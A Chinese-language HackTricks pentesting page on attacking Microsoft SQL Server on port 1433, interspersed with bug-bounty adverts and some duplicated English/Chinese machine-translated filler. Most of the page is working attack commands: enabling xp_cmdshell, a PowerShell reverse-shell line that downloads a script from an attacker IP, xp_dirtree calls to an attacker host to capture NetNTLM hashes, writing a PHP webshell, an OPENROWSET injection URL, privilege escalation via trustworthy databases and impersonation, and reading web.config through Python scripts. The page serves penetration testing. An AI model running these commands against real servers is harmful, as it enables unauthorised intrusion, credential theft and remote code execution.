# 1433 - Pentesting MSSQL - Microsoft SQL Server

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**无需延迟获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中获得经验**\
区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

## 基本信息

**Microsoft SQL Server**是由Microsoft开发的**关系型数据库**管理系统。作为数据库服务器，它是一个软件产品，其主要功能是根据其他软件应用程序的请求存储和检索数据，这些应用程序可以在同一台计算机上运行，也可以在网络（包括互联网）上的另一台计算机上运行。\
来自[wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server)。

**默认端口：** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **默认的MS-SQL系统表**

* **master数据库**：记录SQL Server实例的所有系统级信息。
* **msdb数据库**：被SQL Server Agent用于调度警报和作业。
* **model数据库**：用作在SQL Server实例上创建的所有数据库的模板。对model数据库进行的修改，如数据库大小、排序规则、恢复模型和其他数据库选项，将应用于之后创建的任何数据库。
* **Resource数据库**：是一个只读数据库，包含SQL Server附带的系统对象。系统对象在Resource数据库中物理上持久存在，但在每个数据库的sys模式中逻辑上出现。
* **tempdb数据库**：是一个用于保存临时对象或中间结果集的工作空间。

## 枚举

### 自动枚举

如果对服务一无所知：
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
如果您**没有**凭据，可以尝试猜测它们。您可以使用nmap或metasploit。请注意，如果您使用现有用户名多次登录失败，可能会**锁定帐户**。
{% endhint %}

#### Metasploit（需要凭据）
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**暴力破解**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### 手动枚举

#### 登录
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### 常见枚举

##### Version Detection

##### 版本检测

To determine the version of Microsoft SQL Server running on a target system, you can use the following methods:

要确定目标系统上运行的 Microsoft SQL Server 版本，可以使用以下方法：

- **Banner Grabbing**: Retrieve the server banner by connecting to the SQL Server service on the default port (1433) and analyzing the response. This can be done using tools like `telnet` or `nc`.

- **横幅抓取**：通过连接到默认端口（1433）上的 SQL Server 服务并分析响应来获取服务器横幅。可以使用 `telnet` 或 `nc` 等工具来完成此操作。

- **SQL Server Configuration Manager**: On Windows systems, you can use the SQL Server Configuration Manager to view the installed SQL Server instances and their versions.

- **SQL Server 配置管理器**：在 Windows 系统上，可以使用 SQL Server 配置管理器查看已安装的 SQL Server 实例及其版本。

- **SQL Server Management Studio (SSMS)**: If you have access to the SQL Server Management Studio, you can connect to the target server and check the version information in the Object Explorer.

- **SQL Server Management Studio (SSMS)**：如果可以访问 SQL Server Management Studio，则可以连接到目标服务器并在对象资源管理器中检查版本信息。

##### Service Enumeration

##### 服务枚举

Once you have identified the SQL Server version, you can proceed with service enumeration to gather more information about the target system. Here are some common methods:

一旦确定了 SQL Server 版本，可以继续进行服务枚举以收集有关目标系统的更多信息。以下是一些常见的方法：

- **Port Scanning**: Use a port scanning tool like `nmap` to scan for open ports on the target system. By default, SQL Server listens on port 1433, but it can be configured to use a different port.

- **端口扫描**：使用 `nmap` 等端口扫描工具扫描目标系统上的开放端口。默认情况下，SQL Server 监听端口 1433，但可以配置为使用其他端口。

- **SQL Server Browser Service**: If the SQL Server Browser service is running, it can provide information about the SQL Server instances running on the system, including their names and ports.

- **SQL Server 浏览器服务**：如果 SQL Server 浏览器服务正在运行，它可以提供有关系统上运行的 SQL Server 实例的信息，包括它们的名称和端口。

- **SQL Server Configuration Manager**: Use the SQL Server Configuration Manager to view the network configuration of the SQL Server instances, including the ports they are listening on.

- **SQL Server 配置管理器**：使用 SQL Server 配置管理器查看 SQL Server 实例的网络配置，包括它们正在监听的端口。

- **SQL Server Management Studio (SSMS)**: Connect to the target server using SSMS and explore the Object Explorer to gather information about the SQL Server instances, including their names and ports.

- **SQL Server Management Studio (SSMS)**：使用 SSMS 连接到目标服务器，并在对象资源管理器中探索以收集有关 SQL Server 实例的信息，包括它们的名称和端口。

##### User Enumeration

##### 用户枚举

To enumerate users in a Microsoft SQL Server, you can use the following techniques:

要在 Microsoft SQL Server 中枚举用户，可以使用以下技术：

- **SQL Server Management Studio (SSMS)**: Connect to the target server using SSMS and navigate to the "Security" folder in the Object Explorer. Here, you can view the existing logins and their associated roles.

- **SQL Server Management Studio (SSMS)**：使用 SSMS 连接到目标服务器，并在对象资源管理器中导航到“安全性”文件夹。在这里，可以查看现有的登录名及其关联的角色。

- **SQL Server System Tables**: Query the system tables like `sys.syslogins` or `sys.server_principals` to retrieve information about the users and their permissions.

- **SQL Server 系统表**：查询系统表，如 `sys.syslogins` 或 `sys.server_principals`，以检索有关用户及其权限的信息。

- **SQL Server Extended Stored Procedures**: Some extended stored procedures like `xp_logininfo` can be used to gather information about the users and their roles.

- **SQL Server 扩展存储过程**：一些扩展存储过程，如 `xp_logininfo`，可用于收集有关用户及其角色的信息。

- **SQL Injection**: If the application interacting with the SQL Server is vulnerable to SQL injection, you can use SQL injection techniques to extract user information from the database.

- **SQL 注入**：如果与 SQL Server 交互的应用程序容易受到 SQL 注入攻击，可以使用 SQL 注入技术从数据库中提取用户信息。

##### Password Enumeration

##### 密码枚举

To enumerate passwords in a Microsoft SQL Server, you can try the following methods:

要在 Microsoft SQL Server 中枚举密码，可以尝试以下方法：

- **Brute-Force Attacks**: Use a tool like `hydra` or `medusa` to perform brute-force attacks against the SQL Server login page or the SQL Server service itself.

- **暴力破解攻击**：使用 `hydra` 或 `medusa` 等工具对 SQL Server 登录页面或 SQL Server 服务本身进行暴力破解攻击。

- **Password Spraying**: Instead of trying multiple passwords for a single user, try a single password against multiple user accounts. This can be done using tools like `spray` or `spraywmi`.

- **密码喷洒**：不是为单个用户尝试多个密码，而是针对多个用户帐户尝试单个密码。可以使用 `spray` 或 `spraywmi` 等工具来完成此操作。

- **Default Passwords**: Try common default passwords that are often used for SQL Server installations, such as "sa" with a blank password or "sa" with "sa" as the password.

- **默认密码**：尝试常用的默认密码，这些密码通常用于 SQL Server 安装，例如空密码的 "sa" 或密码为 "sa" 的 "sa"。

- **Password Hash Cracking**: If you have access to the password hashes stored in the SQL Server, you can use tools like `hashcat` or `John the Ripper` to crack the hashes and obtain the plaintext passwords.

- **密码哈希破解**：如果可以访问存储在 SQL Server 中的密码哈希值，可以使用 `hashcat` 或 `John the Ripper` 等工具破解哈希值并获取明文密码。

- **Password Reset**: If you have administrative access to the SQL Server, you can reset the passwords for the user accounts using the SQL Server Management Studio or the `ALTER LOGIN` statement.

- **密码重置**：如果具有 SQL Server 的管理员访问权限，可以使用 SQL Server Management Studio 或 `ALTER LOGIN` 语句重置用户帐户的密码。
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### 获取用户

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### 获取权限

关于MSSQL术语的一些介绍：

1. **可保护资源（Securable）：** 这些是SQL Server数据库引擎授权系统控制访问的资源。可保护资源可以分为三个更广泛的类别：
* 服务器（Server）- 例如数据库、登录、端点、可用性组和服务器角色
* 数据库（Database）- 例如数据库角色、应用程序角色、模式、证书、全文目录、用户
* 模式（Schema）- 例如表、视图、存储过程、函数、同义词
2. **权限（Permission）：** 每个SQL Server可保护资源都有相关的权限，如ALTER、CONTROL、CREATE，可以授予给主体。权限在服务器级别使用登录名进行管理，在数据库级别使用用户进行管理。
3. **主体（Principal）：** 接收对可保护资源的权限的实体称为主体。最常见的主体是登录名和数据库用户。通过授予或拒绝权限，或将登录名和用户添加到具有访问权限的角色中，来控制对可保护资源的访问。
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## 技巧

### 执行操作系统命令

{% hint style="danger" %}
请注意，要能够执行命令，不仅需要启用 **`xp_cmdshell`**，还需要对 **`xp_cmdshell`** 存储过程具有 **EXECUTE 权限**。您可以使用以下命令查看谁（除了 sysadmins）可以使用 **`xp_cmdshell`**：
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
### 窃取NetNTLM哈希值 / 中继攻击

您应该启动一个**SMB服务器**来捕获在身份验证中使用的哈希值（例如`impacket-smbserver`或`responder`）。
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
您可以使用以下命令检查除系统管理员之外的用户是否具有运行这些MSSQL函数的权限：
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

使用诸如**responder**或**Inveigh**之类的工具，可以**窃取NetNTLM哈希**。\
您可以在以下位置了解如何使用这些工具：

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### 滥用MSSQL的可信链接

[**阅读此文章**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **以获取有关如何滥用此功能的更多信息：**

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **写入文件**

要使用`MSSQL`写入文件，我们需要**启用**[**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)，这需要管理员权限，然后执行一些存储过程来创建文件：
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **使用 OPENROWSET 读取文件**

默认情况下，`MSSQL` 允许对操作系统中任何具有读取权限的文件进行读取。我们可以使用以下 SQL 查询语句：
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
然而，**`BULK`** 选项需要 **`ADMINISTER BULK OPERATIONS`** 或 **`ADMINISTER DATABASE BULK OPERATIONS`** 权限。
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### 基于错误的SQLi攻击向量：

This technique involves exploiting SQL injection vulnerabilities by manipulating the application to generate error messages that reveal sensitive information about the database structure or data. By injecting malicious SQL statements, an attacker can force the application to produce error messages that provide valuable insights for further exploitation.

这种技术涉及通过操纵应用程序生成的错误消息来利用SQL注入漏洞，以揭示有关数据库结构或数据的敏感信息。通过注入恶意的SQL语句，攻击者可以迫使应用程序生成错误消息，从而为进一步的攻击提供有价值的信息。

The error-based vector relies on the fact that when an SQL query encounters an error, the database management system (DBMS) often provides detailed error messages that can be leveraged by an attacker. These error messages may contain information such as the SQL query being executed, the database version, or even the underlying file system structure.

基于错误的攻击向量依赖于一个事实，即当SQL查询遇到错误时，数据库管理系统（DBMS）通常会提供详细的错误消息，攻击者可以利用这些错误消息。这些错误消息可能包含正在执行的SQL查询、数据库版本甚至底层文件系统结构等信息。

To exploit this vulnerability, an attacker can intentionally inject malformed SQL statements into user input fields or query parameters. If the application is vulnerable, it will execute the injected SQL statement and generate an error message that can be used to extract valuable information.

为了利用这个漏洞，攻击者可以故意将格式错误的SQL语句注入到用户输入字段或查询参数中。如果应用程序存在漏洞，它将执行注入的SQL语句并生成一个错误消息，可以用来提取有价值的信息。

For example, an attacker can inject a single quote (') character to cause a syntax error in the SQL query. The resulting error message may reveal the structure of the query, allowing the attacker to infer the table and column names. With this information, the attacker can further exploit the vulnerability by crafting specific SQL statements to extract or modify data.

例如，攻击者可以注入一个单引号（'）字符，以在SQL查询中引发语法错误。生成的错误消息可能会揭示查询的结构，使攻击者能够推断出表和列名。有了这些信息，攻击者可以通过构造特定的SQL语句来进一步利用漏洞，提取或修改数据。

It is important to note that error-based SQL injection attacks can be time-consuming and may require trial and error to identify the correct injection points and exploit the vulnerability successfully. Additionally, this technique may not work if the application is configured to suppress detailed error messages or if the attacker does not have access to the error messages.

需要注意的是，基于错误的SQL注入攻击可能耗时，并且可能需要反复尝试才能确定正确的注入点并成功利用漏洞。此外，如果应用程序配置为禁止显示详细的错误消息，或者攻击者无法访问错误消息，则此技术可能无法生效。
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/读取文件执行脚本（Python和R）**

MSSQL可以让您执行**Python和/或R脚本**。这些代码将由一个**不同的用户**执行，而不是使用**xp\_cmdshell**执行命令的用户。

尝试执行一个**'R'** _"Hellow World!"_ **不起作用**的示例：

![](<../../.gitbook/assets/image (185) (1).png>)

使用配置的Python执行多个操作的示例：
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### 读取注册表

Microsoft SQL Server提供了多个扩展存储过程，允许您与网络、文件系统甚至[Windows注册表](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)进行交互：

| **常规**                      | **实例感知**                           |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
### 使用MSSQL用户定义函数（SQLHttp）进行远程命令执行 <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

可以使用自定义函数在MSSQL中加载.NET dll。然而，这需要`dbo`访问权限，因此您需要使用`sa`或管理员角色的数据库连接。

单击[此链接](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp)查看示例。

### 其他远程命令执行的方法

还有其他方法可以实现命令执行，例如添加[扩展存储过程](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server)、[CLR程序集](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration)、[SQL Server代理作业](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15)和[外部脚本](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql)。

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起之际掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声望积分，并登上每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

## MSSQL权限提升

### 从db_owner到sysadmin

如果将**普通用户**赋予**`db_owner`**角色，该角色拥有由管理员用户（例如**`sa`**）拥有的数据库，并且该数据库被配置为**`trustworthy`**，那么该用户可以滥用这些权限进行权限提升，因为在该数据库中创建的存储过程可以作为所有者（管理员）执行。
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
您可以使用**metasploit**模块：
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
或者一个 **PS** 脚本：
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### 冒充其他用户

SQL Server有一个特殊的权限，名为**`IMPERSONATE`**，它允许执行用户扮演另一个用户或登录，直到上下文被重置或会话结束。
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
如果你能冒充一个用户，即使他不是sysadmin，你应该检查该用户是否有访问其他数据库或链接服务器的权限。
{% endhint %}

请注意，一旦你成为sysadmin，你可以冒充任何其他用户：
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
您可以使用**metasploit**模块执行此攻击：
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
或者使用 **PS** 脚本：
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## 使用MSSQL进行持久化

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## 本地权限提升

运行MSSQL服务器的用户将启用特权令牌**SeImpersonatePrivilege**。\
您可能能够通过以下两种方式之一**升级为管理员**：

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## 参考资料

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的时代掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占领每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

## HackTricks自动命令
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

